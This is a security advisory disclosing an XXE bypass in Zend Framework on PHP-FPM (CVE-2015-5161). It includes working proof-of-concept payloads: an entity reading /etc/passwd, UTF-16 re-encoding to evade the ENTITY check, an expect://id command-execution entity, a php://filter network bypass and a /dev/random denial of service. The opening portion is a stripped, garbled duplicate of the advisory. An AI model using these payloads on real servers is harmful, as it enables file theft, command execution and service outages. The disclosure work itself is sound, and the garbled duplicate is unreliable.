process manager into its codebase. However PHP-FPM was available earlier as a
separate project (http://php-fpm.org/).
III. INTRODUCTION
-------------------------
The XML standard defines a concept of external entites.
XXE (XML eXternal Entity) attack is an attack on an application that parses XML
input from untrusted sources using incorrectly configured XML parser.
The application may be forced to open arbitrary files and/or network resources.
Exploiting XXE issues on PHP applications may also lead to denial of service or
in some cases (for example, when an 'expect' PHP module is installed) lead to
command execution.
An independent security reserach of Zend Framework revealed that it is
possible to bypass XXE security controls within the framework in case
the PHP application using Zend XML related classes (e.g Zend\_XmlRpc\_Server,
Zend\_Feed, Zend\_Config\_Xml etc.) from Zend Framework is served via PHP FPM.
Bypassing the controls may allow XXE attacks and lead to the aforementioned
exploitation possibilities on systems where the XML parser is set to resolve
entities.
IV. DESCRIPTION
-------------------------
The security controls within the Zend Framework mitigate the XXE attack vectors
by first calling libxml\_disable\_entity\_loader(), and then looping
through the DOMDocument nodes testing if any is of type: XML\_DOCUMENT\_TYPE\_NODE
If so, an exception is raised and PHP script execution is halted.
These controls have been included in the scan() function of a Zend\_Xml\_Security
class located in the following paths depending on the code branch of Zend
Framework:
ZendFramework-1.12.13/library/Zend/Xml/Security.php
ZendFramework-2.4.2/library/ZendXml/Security.php
In case of the latest version of ZendFramework-1.12.13,
the relevant code blocks from the scan() function look as follows:
---[library/Zend/Xml/Security.php ]---
public static function scan($xml, DOMDocument $dom = null)
{
if (self::isPhpFpm()) {
self::heuristicScan($xml);
}
if (!self::isPhpFpm()) {
$loadEntities = libxml\_disable\_entity\_loader(true);
$useInternalXmlErrors = libxml\_use\_internal\_errors(true);
}
// Load XML with network access disabled (LIBXML\_NONET)
$result = $dom->loadXml($xml, LIBXML\_NONET);
restore\_error\_handler();
if (!self::isPhpFpm()) {
libxml\_disable\_entity\_loader($loadEntities);
libxml\_use\_internal\_errors($useInternalXmlErrors);
}
if (!$result) {
return false;
}
// Scan for potential XEE attacks using ENTITY, if not PHP-FPM
if (!self::isPhpFpm()) {
foreach ($dom->childNodes as $child) {
if ($child->nodeType === XML\_DOCUMENT\_TYPE\_NODE) {
if ($child->entities->length > 0) {
require\_once 'Exception.php';
throw new Zend\_Xml\_Exception(self::ENTITY\_DETECT);
}
}
}
}
if (isset($simpleXml)) {
$result = simplexml\_import\_dom($dom);
if (!$result instanceof SimpleXMLElement) {
return false;
}
return $result;
}
return $dom;
--------------------------------------
As we can see from the code, the application disables the entity loader
(via libxml\_disable\_entity\_loader), it also disables network access
(LIBXML\_NONET), and it additionally scans provided XML for the presence of XML
entities to prevent potential entity expansion attacks.
The code succesfully prevents most XXE attacks.
However, as the PHP libxml\_disable\_entity\_loader() function was reported not
thread safe (the entity loader setting could potentially get overwritten
between hits in FPM processes), Zend Framework does not use it when the
application is hosted in a PHP-FPM environment. Instead, another approach is
taken to prevent the XXE attacks.
In the code above we see the check !self::isPhpFpm() which determines the type
of interface between web server and PHP (through the php\_sapi\_name() function).
If the SAPI is FPM-CGI (i.e. PHP-FPM) the following heuristicScan function gets
executed:
---[library/Zend/Xml/Security.php ]---
protected static function heuristicScan($xml)
{
if (strpos($xml, 'addFunction('helloworld');
echo $server->handle();
?>
-------------------------------
This test application is hosted on an Apache server with PHP-FPM.
Requesting:
POST /zend\_poc/zend-xmlrpc-server.php HTTP/1.1
Host: apache-php-fpm
xml version="1.0" encoding="UTF-8"?
helloworld

should return:
Hello world!
This request was executed via fpm-fcgi.

In order to exploit the XXE vulnerability contained in the Zend framework
an attacker can pass XML data containing external entities similar to:
xml version="1.0" encoding="UTF-8"?

]>
retrieved: &pocdata

Feeding the above data to the zend-xmlrpc-server.php script will result in
an error:
631faultString
Failed to parse request

which is due to the heuristicScan ENTITy detection.
We can now encode the data to avoid the check.
$ cat poc-utf8.xml | sed 's/UTF-8/UTF-16/' \
| iconv -f UTF-8 -t UTF-16 >poc-utf16.xml
Hex representation of the UTF-16 encoded XML file (including the change in
the xml header to reflect the new encoding) looks as follows:
$ hexdump -C poc-utf16.xml

As can be seen on the hexdump, the ENTITY word is encoded using 2-byte
characters.
Resupplying the encoded data contained in poc-utf16.xml to the Zend XMLRPC
application, depending on the underlying libxml library, may result in a
password file retrival from the remote server:
$ wget -q -O /dev/stdout http://apache-phpfpm/zend\_poc/zend-xmlrpc-server.php \
--post-file=poc-utf16.xml
xml version="1.0" encoding="UTF-8"?

daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[cut]
" does not exist

If the password file is not returned, an attacker may try another version
of an XXE attack using parameter entities and an out-of-band communication.
Both of these can be used to exploit the vulnerability in Zend Framework on
a greater number of libxml configurations.
Remote command execution may also be possible if the remote system has an
'expect' php module (libexpect-php) installed.
If this is the case, we can for example execute 'id' command via injecting
the entity:

which should return a result similar to:
xml version="1.0" encoding="UTF-8"?
faultCode
620faultString
Method "retrieved: uid=33(www-data) gid=33(www-data)
groups=33(www-data) " does not exist
A separate POC exploit (zend-xmlrpc-exploit-cmd-exec.sh) is included which
runs commands with parameters and also implements parameter entities/OOB
communication.
As mentioned in the description of this vulnerability, the Zend Framework
adds a LIBXML\_NONET flag to the loadXML() call in order to prevent reaching
network resources through XXE.
As a result, requesting a network resource such as http://192.168.57.10 via XXE
injection will fail.
This can be bypassed by using php://filter wrapper inside an entity, e.g:

This will return a base64 encoded response from the remote server bypassing
the LIBXML\_NONET restriction:
xml version="1.0" encoding="UTF-8"?

This vulnerability may also lead to Denial of Service if for example the attacker
requests /dev/random file through XXE. This will cause the application to block
on the endless input from the random generator pseudo device, until the maximum
execution time is reached.
Sending multiple requests of such kind would exhaust the maximum number of
threads that the web server can create.
VI. BUSINESS IMPACT
-------------------------
An unauthenticated remote exploitation may be possible on applications which
make use of Zend\_XmlRpc\_Server with a public XML-RPC endpoint as demonstrated
in this advisory.
Authentication in case of XML-RPC is not required for exploitation
as the XML needs to be processed first in order for the application to read
the credentials passed from the login data within the xml-formatted input.
This issue should be marked as high/critical due to the wide deployment of Zend
Framework (which includes some major CMS and e-commerce applications), the
number of Zend XML classes affected, low complexity of exploitation, as well
as a possibility of an unauthenticated remote exploitation.
There is also a growing number of servers set up to serve PHP code with PHP-FPM,
especially in web hosting environments which need to respond to heavy load.
VII. SYSTEMS AFFECTED
-------------------------
All systems making use of Zend Framework in versions starting from
1.12.4 and 2.1.6 up to the latest versions of Zend Framework 1.12.13 (released
2015-05-20) and 2.4.2 (released 2015-05-11) contain the XXE injection
vulnerability described in this advisory.

# Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM

---

*From*: Dawid Golunski <golunski.dawid () gmail com>

```
=============================================
- Release date: 12.08.2015
- Discovered by: Dawid Golunski
- Severity: High
- CVE-ID: CVE-2015-5161
=============================================

I. VULNERABILITY
-------------------------

Zend Framework <= 2.4.2     XML eXternal Entity Injection (XXE) on PHP FPM
Zend Framework <= 1.12.13

II. BACKGROUND
-------------------------

- Zend Framework

```
> ```
> From <http://framework.zend.com/about/> website:
>
> ```

```

"Zend Framework 2 is an open source framework for developing web applications
and services using PHP 5.3+. Zend Framework 2 uses 100% object-oriented code and
utilises most of the new features of PHP 5.3, namely namespaces, late static
binding, lambda functions and closures.

Zend Framework 2 evolved from Zend Framework 1, a successful PHP framework with
over 15 million downloads."

- PHP FPM

<http://php.net/manual/en/install.fpm.php>

"FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with
 some additional features (mostly) useful for heavy-loaded sites."

Starting from release 5.3.3 in early 2010, PHP merged the php-fpm fastCGI
process manager into its codebase. However PHP-FPM was available earlier as a
separate project (<http://php-fpm.org/>).

III. INTRODUCTION
-------------------------

The XML standard defines a concept of external entites.
XXE (XML eXternal Entity) attack is an attack on an application that parses XML
input from untrusted sources using incorrectly configured XML parser.
The application may be forced to open arbitrary files and/or network resources.
Exploiting XXE issues on PHP applications may also lead to denial of service or
in some cases (for example, when an 'expect' PHP module is installed) lead to
command execution.

An independent security reserach of Zend Framework revealed that it is
possible to bypass XXE security controls within the framework in case
the PHP application using Zend XML related classes (e.g Zend_XmlRpc_Server,
Zend_Feed, Zend_Config_Xml etc.) from Zend Framework is served via PHP FPM.
Bypassing the controls may allow XXE attacks and lead to the aforementioned
exploitation possibilities on systems where the XML parser is set to resolve
entities.

IV. DESCRIPTION
-------------------------

The security controls within the Zend Framework mitigate the XXE attack vectors
by first calling libxml_disable_entity_loader(), and then looping
through the DOMDocument nodes testing if any is of type: XML_DOCUMENT_TYPE_NODE
If so, an exception is raised and PHP script execution is halted.

These controls have been included in the scan() function of a Zend_Xml_Security
class located in the following paths depending on the code branch of Zend
Framework:

ZendFramework-1.12.13/library/Zend/Xml/Security.php

ZendFramework-2.4.2/library/ZendXml/Security.php

In case of the latest version of ZendFramework-1.12.13,
the relevant code blocks from the scan() function look as follows:

---[library/Zend/Xml/Security.php ]---

    public static function scan($xml, DOMDocument $dom = null)
    {
        if (self::isPhpFpm()) {
            self::heuristicScan($xml);
        }

        if (!self::isPhpFpm()) {
            $loadEntities = libxml_disable_entity_loader(true);
            $useInternalXmlErrors = libxml_use_internal_errors(true);
        }

        // Load XML with network access disabled (LIBXML_NONET)
        $result = $dom->loadXml($xml, LIBXML_NONET);
        restore_error_handler();

        if (!self::isPhpFpm()) {
            libxml_disable_entity_loader($loadEntities);
            libxml_use_internal_errors($useInternalXmlErrors);
        }

        if (!$result) {
            return false;
        }

        // Scan for potential XEE attacks using ENTITY, if not PHP-FPM
        if (!self::isPhpFpm()) {
            foreach ($dom->childNodes as $child) {
                if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
                    if ($child->entities->length > 0) {
                        require_once 'Exception.php';
                        throw new Zend_Xml_Exception(self::ENTITY_DETECT);
                    }
                }
            }
        }

        if (isset($simpleXml)) {
            $result = simplexml_import_dom($dom);
            if (!$result instanceof SimpleXMLElement) {
                return false;
            }
            return $result;
        }
        return $dom;

--------------------------------------

As we can see from the code, the application disables the entity loader
(via libxml_disable_entity_loader), it also disables network access
(LIBXML_NONET), and it additionally scans provided XML for the presence of XML
entities to prevent potential entity expansion attacks.
The code succesfully prevents most XXE attacks.

However, as the PHP libxml_disable_entity_loader() function was reported not
thread safe (the entity loader setting could potentially get overwritten
between hits in FPM processes), Zend Framework does not use it when the
application is hosted in a PHP-FPM environment. Instead, another approach is
taken to prevent the XXE attacks.

In the code above we see the check !self::isPhpFpm() which determines the type
of interface between web server and PHP (through the php_sapi_name() function).
If the SAPI is FPM-CGI (i.e. PHP-FPM) the following heuristicScan function gets
executed:

---[library/Zend/Xml/Security.php ]---

    protected static function heuristicScan($xml)
    {
        if (strpos($xml, '<!ENTITY') !== false) {
            require_once 'Exception.php';
            throw new Zend_Xml_Exception(self::ENTITY_DETECT);
        }
    }

--------------------------------------

It validates provided XML by searching for any entity declaration. It throws an
exception if it finds one.
Although this check cannot be bypassed by simply adding spaces or changing
the characters to lower case (an XML parser would reject such declaration
as invalid), this security check is nevertheless insufficient.

XML format allows for different types of encoding to be used, hence it is
possible to bypass the check by supplying specifically encoded XML content.
For example, a UTF-16 encoding which uses 2-byte characters would be enough to
bypass the ENTITY string check.

Apart from the ENTITY check, the code also adds the aformentioned LIBXML_NONET
parameter to catch entities refering to network resources.
This limitation can also be bypassed as shown in the proof of concept exploit.

This makes the Zend Framework vulnerable to XXE injection attacks.

V. PROOF OF CONCEPT
-------------------------

Below is a simple PHP application using Zend Framework to implement an XML-RPC
server for demonstation:

---[ zend_xmlrpc_server.php ]--

<?php
// Simple XML-RPC SERVER

function helloworld() {
   $text = "Hello world! This request was executed via ".php_sapi_name().".";
   return $text;
}
set_include_path("./ZendFramework-1.12.13/library/");
require_once("./ZendFramework-1.12.13/library/Zend/Loader/Autoloader.php");
Zend_Loader_Autoloader::getInstance();

$server = new Zend_XmlRpc_Server();
$server->addFunction('helloworld');

echo $server->handle();
?>

-------------------------------

This test application is hosted on an Apache server with PHP-FPM.

Requesting:

POST /zend_poc/zend-xmlrpc-server.php HTTP/1.1
Host: apache-php-fpm

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>helloworld</methodName>
</methodCall>

should return:

<methodResponse><params><param><value><string>Hello world!
This request was executed via fpm-fcgi.</string></value></param></params>
</methodResponse>

In order to exploit the XXE vulnerability contained in the Zend framework
an attacker can pass XML data containing external entities similar to:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE methodCall [
  <!ENTITY pocdata SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>retrieved: &pocdata;</methodName>
</methodCall>

Feeding the above data to the zend-xmlrpc-server.php script will result in
an error:

<int>631</int></value></member><member><name>faultString</name><value>
<string>Failed to parse request</string></value></member></struct></value>
</fault></methodResponse>

which is due to the heuristicScan ENTITy detection.

We can now encode the data to avoid the check.

$ cat poc-utf8.xml |  sed 's/UTF-8/UTF-16/' \
| iconv -f UTF-8 -t UTF-16 >poc-utf16.xml

Hex representation of the UTF-16 encoded XML file (including the change in
the xml header to reflect the new encoding) looks as follows:

$ hexdump -C poc-utf16.xml

As can be seen on the hexdump, the ENTITY word is encoded using 2-byte
characters.

Resupplying the encoded data contained in poc-utf16.xml to the Zend XMLRPC
application, depending on the underlying libxml library, may result in a
password file retrival from the remote server:

$ wget -q -O /dev/stdout <http://apache-phpfpm/zend_poc/zend-xmlrpc-server.php> \
--post-file=poc-utf16.xml

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value>
<int>620</int></value></member><member><name>faultString</name><value><string>
Method &quot;retrieved: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[cut]
&quot; does not exist</string></value></member></struct></value></fault>
</methodResponse>

If the password file is not returned, an attacker may try another version
of an XXE attack using parameter entities and an out-of-band communication.
Both of these can be used to exploit the vulnerability in Zend Framework on
a greater number of libxml configurations.

Remote command execution may also be possible if the remote system has an
'expect' php module (libexpect-php) installed.
If this is the case, we can for example execute 'id' command via injecting
the entity:

<!ENTITY pocdata SYSTEM "expect://id">

which should return a result similar to:

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value>
<int>620</int></value></member><member><name>faultString</name><value>
<string>Method &quot;retrieved: uid=33(www-data) gid=33(www-data)
groups=33(www-data) &quot; does not exist</string></value></member>

A separate POC exploit (zend-xmlrpc-exploit-cmd-exec.sh) is included which
runs commands with parameters and also implements parameter entities/OOB
communication.

As mentioned in the description of this vulnerability, the Zend Framework
adds a LIBXML_NONET flag to the loadXML() call in order to prevent reaching
network resources through XXE.

As a result, requesting a network resource such as <http://192.168.57.10> via XXE
injection will fail.

This can be bypassed by using php://filter wrapper inside an entity, e.g:

<!ENTITY pocdata SYSTEM "php://filter/read=convert.base64-encode/
resource=<http://192.168.57.10">;>

This will return a base64 encoded response from the remote server bypassing
the LIBXML_NONET restriction:

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><fault><value><struct><member><name>faultCode</name><value><int>620</int>
</value></member><member><name>faultString</name><value><string>Method &quot;

j0idG9wIj48aW1nIHNyYz0iL2ljb[cut]

This vulnerability may also lead to Denial of Service if for example
the attacker
requests /dev/random file through XXE. This will cause the application to block
on the endless input from the random generator pseudo device, until the maximum
execution time is reached.
Sending multiple requests of such kind would exhaust the maximum number of
threads that the web server can create.

VI. BUSINESS IMPACT
-------------------------

An unauthenticated remote exploitation may be possible on applications which
make use of Zend_XmlRpc_Server with a public XML-RPC endpoint as demonstrated
in this advisory.
Authentication in case of XML-RPC is not required for exploitation
as the XML needs to be processed first in order for the application to read
the credentials passed from the login data within the xml-formatted input.

This issue should be marked as high/critical due to the wide deployment of Zend
Framework (which includes some major CMS and e-commerce applications), the
number of Zend XML classes affected, low complexity of exploitation, as well
as a possibility of an unauthenticated remote exploitation.
There is also a growing number of servers set up to serve PHP code with PHP-FPM,
especially in web hosting environments which need to respond to heavy load.

VII. SYSTEMS AFFECTED
-------------------------

All systems making use of Zend Framework in versions starting from
1.12.4 and 2.1.6 up to the latest versions of Zend Framework 1.12.13 (released
2015-05-20) and 2.4.2 (released 2015-05-11) contain the XXE injection
vulnerability described in this advisory.

All Zend Framework classes making use of XML and calling the vulnerable
Zend_Xml_Security::scan() function are affected by this issue:

Zend/Amf/Parse/Amf0/Deserializer.php
Zend/Amf/Parse/Amf3/Deserializer.php
Zend/Config/Xml.php
Zend/Dom/Query.php
Zend/Feed/Abstract.php
Zend/Feed/Entry/Abstract.php
Zend/Feed/Entry/Atom.php
Zend/Feed.php
Zend/Feed/Reader.php
Zend/Feed/Writer/Renderer/Entry/Atom.php
Zend/Gdata/App/Base.php
Zend/Gdata/App.php
Zend/Gdata/Gapps/ServiceException.php
Zend/Gdata/YouTube.php
Zend/Json.php
Zend/Mobile/Push/Message/Mpns/Raw.php
Zend/Rest/Client/Result.php
Zend/Search/Lucene/Document/Docx.php
Zend/Search/Lucene/Document/OpenXml.php
Zend/Search/Lucene/Document/Pptx.php
Zend/Search/Lucene/Document/Xlsx.php
Zend/Serializer/Adapter/Wddx.php
Zend/Service/Amazon/Ec2/Response.php
Zend/Service/Amazon.php
Zend/Service/Amazon/SimpleDb/Response.php
Zend/Service/Audioscrobbler.php
Zend/Service/Delicious.php
Zend/Service/Ebay/Finding.php
Zend/Service/Flickr.php
Zend/Service/SlideShare.php
Zend/Service/SqlAzure/Management/Client.php
Zend/Service/Technorati.php
Zend/Service/WindowsAzure/Diagnostics/ConfigurationInstance.php
Zend/Service/WindowsAzure/Management/Client.php
Zend/Service/WindowsAzure/Storage.php
Zend/Service/Yahoo.php
Zend/Soap/Server.php
Zend/Soap/Wsdl.php
Zend/XmlRpc/Request.php
Zend/XmlRpc/Response.php

The vulnerability can be exploited in applications using vulnerable version
of the framework, where PHP code is served with PHP-FPM, and when the xml parser
installed in the system is set up to resolves entities.

PHP-FPM can be set up on popular web servers such as Apache, or Nginx
on Linux/Unix, as well as Windows systems (as per the 'fpm on cygwin' setup
guides available on the Internet).

VIII. SOLUTION
